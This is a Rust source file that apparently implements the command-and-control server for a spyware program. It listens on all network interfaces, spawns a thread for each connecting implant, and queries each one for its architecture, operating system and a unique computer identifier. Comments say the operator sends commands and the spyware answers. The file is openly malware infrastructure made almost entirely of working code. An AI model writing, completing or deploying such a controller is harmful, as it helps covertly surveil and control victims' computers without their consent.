use crate::command::{get_basic_spyware_info, get_unique_computer_identifier};
use std::net::{TcpListener, TcpStream};
use std::thread;

pub const BIND_ANY: &str = "0.0.0.0";

fn handle_connected_spyware_client(mut stream: TcpStream) {
    let basic_info = get_basic_spyware_info(&mut stream)
        .expect("Could not get response to basic spyware info. Can not continue.");
    println!(
        "Info about connected spyware - {:?} {:?} {:?}",
        basic_info.arch, basic_info.target_os, basic_info.pointer_width
    );
    // The spyware does not give orders to us, the only functionality is we send commands and get responses.
    let identifier = get_unique_computer_identifier(&mut stream);
    // Even if the spyware is unidentified, we can continue and do some of the tasks with it.
    if identifier.is_ok() {
        println!("Spyware connected identified as '{}'!", identifier.unwrap())
    }
}

pub fn run_server(port: u16) {
    // If this function fails, it should and will panic.
    let listener =
        TcpListener::bind(format!("{}:{}", BIND_ANY, port)).expect("Could not bind to port");

    let address = listener
        .local_addr()
        .expect("Error while trying to get local address.");
    println!("Listening for connections on: {:?}", address);

    // accept connections and process them in a new thread
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!(
                    "New connection from: {}",
                    stream.peer_addr().expect("Could not get remote address")
                );
                thread::spawn(move || {
                    // connection succeeded
                    handle_connected_spyware_client(stream)
                });
            }
            Err(e) => {
                println!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    }
}
